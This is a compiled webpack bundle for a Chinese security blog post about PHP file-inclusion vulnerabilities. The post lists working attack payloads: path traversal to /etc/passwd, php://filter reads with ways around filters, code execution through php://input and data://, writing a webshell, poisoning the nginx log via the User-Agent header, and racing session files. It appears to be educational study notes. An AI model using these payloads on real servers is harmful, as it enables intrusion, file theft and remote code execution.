"use strict";(self.webpackChunkblog=self.webpackChunkblog||[]).push([[263],{6262:(e,t)=>{t.A=(e,t)=>{const s=e.__vccOpts||e;for(const[e,p]of t)s[e]=p;return s}},1566:(e,t,s)=>{s.r(t),s.d(t,{comp:()=>n,data:()=>o});var p=s(641);const a={},n=(0,s(6262).A)(a,[["render",function(e,t){return(0,p.uX)(),(0,p.CE)("div",null,[t[0]||(t[0]=(0,p.Lk)("h1",{id:"简述",tabindex:"-1"},[(0,p.Lk)("a",{class:"header-anchor",href:"#简述"},[(0,p.Lk)("span",null,"简述")])],-1)),t[1]||(t[1]=(0,p.Lk)("p",null,"开发人员为提高代码重用性，会将可复用函数或语句写在单个文件中，使用时调用，此为文件包含。若开发时将被包含文件路径设为变量以动态调用，且 Web 应用未对该参数严格校验，使攻击者能控制被包含文件路径，就会产生文件包含漏洞。几乎所有脚本都有文件包含功能，在 PHP 的 Web 应用中较为常见。",-1)),(0,p.Q3)(" more "),t[2]||(t[2]=(0,p.Fv)('<ul><li><strong>远程包含</strong></li><li><strong>本地包含</strong></li></ul><h3 id="远程包含" tabindex="-1"><a class="header-anchor" href="#远程包含"><span>远程包含</span></a></h3><p>需要对方服务器开启远程开关；若是能够远程，可以将敏感的PHP文件以TXT后缀放在自已服务器上，让对方服务器远程访问URL：<code>xxx.php?file:http://xxx.xxx/1.txt</code>对方服务器即可以PHP脚本执行。</p><h3 id="本地包含" tabindex="-1"><a class="header-anchor" href="#本地包含"><span>本地包含</span></a></h3><p>只能控制固定文件（服务器现有文件）；如果有文件上传漏洞可以搭配本地文件包含漏洞，文件写着恶意代码，可以直接利用。</p><p><em>若是没有上传文件漏洞：</em></p><blockquote><ol><li><strong>包含日志文件利用</strong></li><li><strong>包含session文件利用</strong></li><li><strong>无文件伪协议玩法利用</strong></li></ol></blockquote><h2 id="伪协议" tabindex="-1"><a class="header-anchor" href="#伪协议"><span>伪协议</span></a></h2><p><strong>常见伪协议：<code>file://，php://filter，php://input，zip://，data://</code></strong></p><h3 id="文件读取" tabindex="-1"><a class="header-anchor" href="#文件读取"><span>文件读取</span></a></h3><p><strong>【“ ?file= ”只是传参值，可随代码书写变量变动。】</strong></p><p><strong><code>?file=file://../../../../../../../etc/passwd</code></strong><strong><code>?file=php://filter/read=convert.base64-encode/resource=../../phpinfo.php</code></strong></p><p>读取服务器目录下的phpinfo.php文件，若是没有显示空白，若是有则返回base64编码后的内容</p><p>【如果出现read、base、convert等关键字过滤可以尝试使用：string、utf8、utf16】</p><p><strong>例如：</strong></p><p><strong><code>php://filter/convert.iconv.utf-8.utf-16/resource=flag.php</code></strong><strong><code>php://filter/convert.iconv.UTF-8*.UCS-4LE*/resource=flag.php</code></strong></p><p>这些是read，base64，encode，string被过滤的情况。</p><h3 id="文件写入" tabindex="-1"><a class="header-anchor" href="#文件写入"><span>文件写入</span></a></h3><p><strong><code>?file=php://input</code></strong></p><p>需要利用Post data里写PHP代码，即可直接执行代码。</p><p><img src="/assets/images/2025-02-17/t1.png" alt=""></p><p><strong><code>?file=php://filter/write=convert.base64-decode/resource=123.php</code></strong></p><p>然后将恶意PHP代码编码为base64写入Post data里（前面需要加content=），再次访问123.php然后在Post data中写执行参数即可执行。</p><p><img src="/assets/images/2025-02-17/t2.png" alt=""></p><h3 id="文件执行" tabindex="-1"><a class="header-anchor" href="#文件执行"><span>文件执行</span></a></h3><p><strong><code>?file=data://text/plain,&lt;?php phpinfo();?&gt;</code></strong></p><p>将直接执行后面的php代码。</p><p><strong><code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></strong></p><p>将php代码编码为base64，然后写入data://text/plain;base64,后面，再次访问即可执行。</p><h2 id="日志包含" tabindex="-1"><a class="header-anchor" href="#日志包含"><span>日志包含</span></a></h2><p><strong>nginx服务器日志文件</strong></p><p><strong><code>?file=/var/log/nginx/access.log</code></strong></p><p>查看日志文件，发现日志文件里记录UA信息，可以尝试把恶意php代码写入UA中，使其让服务器执行。</p><h3 id="session包含" tabindex="-1"><a class="header-anchor" href="#session包含"><span>Session包含</span></a></h3><p><strong>Session文件特性是会自动清除内容；session文件通常在<code>/tmp/sess_test</code></strong></p><p>需要对上传表单或者上传文件（自建html，传递对方服务器）进行抓包，在Cookie内容中写 <strong><code>PHPSESSID=test</code></strong>，那么session固定文件名就是<em>sess_test</em> 表单内容写入【创建php文件 ——&gt; 写入php代码】。</p><p><img src="/assets/images/2025-02-17/t3.png" alt=""></p><p>需要不断的发包，让session文件不断的写入这个php执行代码。然后浏览器不断的访问这个session文件。<strong>使用bp无payload爆破</strong></p><p><img src="/assets/images/2025-02-17/t4.png" alt=""></p><p>最后，手动执行写入的php文件（<strong>案例是不断地访问shell.php文件，需不断的刷新执行</strong>）</p><p><img src="/assets/images/2025-02-17/t5.png" alt=""></p><h2 id="文件下载" tabindex="-1"><a class="header-anchor" href="#文件下载"><span>文件下载</span></a></h2><p>可能存在安全问题的URL：</p><p><strong><code>http(s)://www.xxx.com/upload?file=xxx.pdf</code></strong></p><p><strong><code>http(s)://www.xxx.com/upload?data=php://filter/read=convert.base64-encode/resource=xxx.pdf</code></strong></p><p>...</p><p><img src="/assets/images/2025-02-17/t6.png" alt=""></p><h2 id="目录安全" tabindex="-1"><a class="header-anchor" href="#目录安全"><span>目录安全</span></a></h2><h3 id="目录遍历" tabindex="-1"><a class="header-anchor" href="#目录遍历"><span>目录遍历</span></a></h3><p><strong><code>http://www.xxx.com/upload?file=../../../../etc/passwd</code></strong></p><p>此外，如果目录内没有index文件索引将会暴露目录，将目录所有文件或文件夹列出。</p><h3 id="目录穿越" tabindex="-1"><a class="header-anchor" href="#目录穿越"><span>目录穿越</span></a></h3><p>目录权限控制不当；如果代码中设定了只允许在此目录（/test）下进行操作，但是用户可以通过 <strong><code>/test/../../../../../</code></strong> 进行绕过过滤。</p>',53))])}]]),o=JSON.parse('{"path":"/posts/Web%E5%AE%89%E5%85%A8/2025-02-17.html","title":"Web文件包含漏洞","lang":"zh-CN","frontmatter":{"title":"Web文件包含漏洞","cover":null,"icon":"pen-to-square","date":"2025-02-17T00:00:00.000Z","category":["Web安全笔记"],"tag":["Web漏洞","Web安全"],"star":false,"sticky":false,"description":"开发人员为提高代码重用性，会将可复用函数或语句写在单个文件中，使用时调用，此为文件包含。若开发时将被包含文件路径设为变量以动态调用，且 Web 应用未对该参数严格校验，使攻击者能控制被包含文件路径，就会产生文件包含漏洞。几乎所有脚本都有文件包含功能，在 PHP 的 Web 应用中较为常见。","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/posts/Web%E5%AE%89%E5%85%A8/2025-02-17.html"}],["meta",{"property":"og:site_name","content":"云晞科技"}],["meta",{"property":"og:title","content":"Web文件包含漏洞"}],["meta",{"property":"og:description","content":"开发人员为提高代码重用性，会将可复用函数或语句写在单个文件中，使用时调用，此为文件包含。若开发时将被包含文件路径设为变量以动态调用，且 Web 应用未对该参数严格校验，使攻击者能控制被包含文件路径，就会产生文件包含漏洞。几乎所有脚本都有文件包含功能，在 PHP 的 Web 应用中较为常见。"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://mister-hope.github.io/assets/images/2025-02-17/t1.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-02-17T05:58:19.000Z"}],["meta",{"property":"article:tag","content":"Web漏洞"}],["meta",{"property":"article:tag","content":"Web安全"}],["meta",{"property":"article:published_time","content":"2025-02-17T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-02-17T05:58:19.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Web文件包含漏洞\\",\\"image\\":[\\"https://mister-hope.github.io/assets/images/2025-02-17/t1.png\\",\\"https://mister-hope.github.io/assets/images/2025-02-17/t2.png\\",\\"https://mister-hope.github.io/assets/images/2025-02-17/t3.png\\",\\"https://mister-hope.github.io/assets/images/2025-02-17/t4.png\\",\\"https://mister-hope.github.io/assets/images/2025-02-17/t5.png\\",\\"https://mister-hope.github.io/assets/images/2025-02-17/t6.png\\"],\\"datePublished\\":\\"2025-02-17T00:00:00.000Z\\",\\"dateModified\\":\\"2025-02-17T05:58:19.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"Lucifrix\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":3,"title":"远程包含","slug":"远程包含","link":"#远程包含","children":[]},{"level":3,"title":"本地包含","slug":"本地包含","link":"#本地包含","children":[]},{"level":2,"title":"伪协议","slug":"伪协议","link":"#伪协议","children":[{"level":3,"title":"文件读取","slug":"文件读取","link":"#文件读取","children":[]},{"level":3,"title":"文件写入","slug":"文件写入","link":"#文件写入","children":[]},{"level":3,"title":"文件执行","slug":"文件执行","link":"#文件执行","children":[]}]},{"level":2,"title":"日志包含","slug":"日志包含","link":"#日志包含","children":[{"level":3,"title":"Session包含","slug":"session包含","link":"#session包含","children":[]}]},{"level":2,"title":"文件下载","slug":"文件下载","link":"#文件下载","children":[]},{"level":2,"title":"目录安全","slug":"目录安全","link":"#目录安全","children":[{"level":3,"title":"目录遍历","slug":"目录遍历","link":"#目录遍历","children":[]},{"level":3,"title":"目录穿越","slug":"目录穿越","link":"#目录穿越","children":[]}]}],"git":{"createdTime":1739771899000,"updatedTime":1739771899000,"contributors":[{"name":"achenc1013","username":"achenc1013","email":"1013199991@qq.com","commits":1,"url":"https://github.com/achenc1013"}]},"readingTime":{"minutes":3.14,"words":941},"filePathRelative":"posts/Web安全/2025-02-17.md","localizedDate":"2025年2月17日","excerpt":"\\n<p>开发人员为提高代码重用性，会将可复用函数或语句写在单个文件中，使用时调用，此为文件包含。若开发时将被包含文件路径设为变量以动态调用，且 Web 应用未对该参数严格校验，使攻击者能控制被包含文件路径，就会产生文件包含漏洞。几乎所有脚本都有文件包含功能，在 PHP 的 Web 应用中较为常见。</p>\\n","autoDesc":true}')}}]);